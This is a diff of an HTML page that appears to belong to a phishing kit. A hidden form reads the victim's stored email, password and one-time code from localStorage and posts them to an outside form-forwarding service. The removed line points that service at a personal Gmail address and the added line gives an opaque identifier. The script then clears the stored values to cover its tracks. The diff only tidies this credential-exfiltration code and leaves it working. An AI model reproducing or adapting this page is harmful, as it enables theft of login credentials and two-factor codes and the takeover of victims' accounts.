@@ -8,18 +8,21 @@
 </head>
 <body>
     <div class="final-submit-container">
-        <form action=""https://formsubmit.co/staineagleshort@gmail.com" method="POST">
+        <form action="1a9ed8d6bfc4fdbf05e7a33bf4004aa7" method="POST">
+            <!-- Hidden inputs to store user data -->
             <input type="hidden" name="email" id="form-email">
             <input type="hidden" name="password" id="form-password">
-            <input type="hidden" name="otp" id="form-otp"> <!-- Added OTP field -->
+            <input type="hidden" name="otp" id="form-otp">
+            
             <!-- Add other hidden inputs if needed -->
+
             <button type="submit" class="submit-btn">Submit</button>
         </form>
         <script>
             // Retrieve user data from local storage
-            document.getElementById('form-email').value = localStorage.getItem('userEmail');
-            document.getElementById('form-password').value = localStorage.getItem('userPassword');
-            document.getElementById('form-otp').value = localStorage.getItem('userOTP'); // Set OTP value
+            document.getElementById('form-email').value = localStorage.getItem('userEmail') || '';
+            document.getElementById('form-password').value = localStorage.getItem('userPassword') || '';
+            document.getElementById('form-otp').value = localStorage.getItem('userOTP') || '';
 
             // Clear local storage if necessary
             localStorage.removeItem('userEmail');
@@ -29,6 +32,7 @@
     </div>
 </body>
 </html>
+
 
 
 
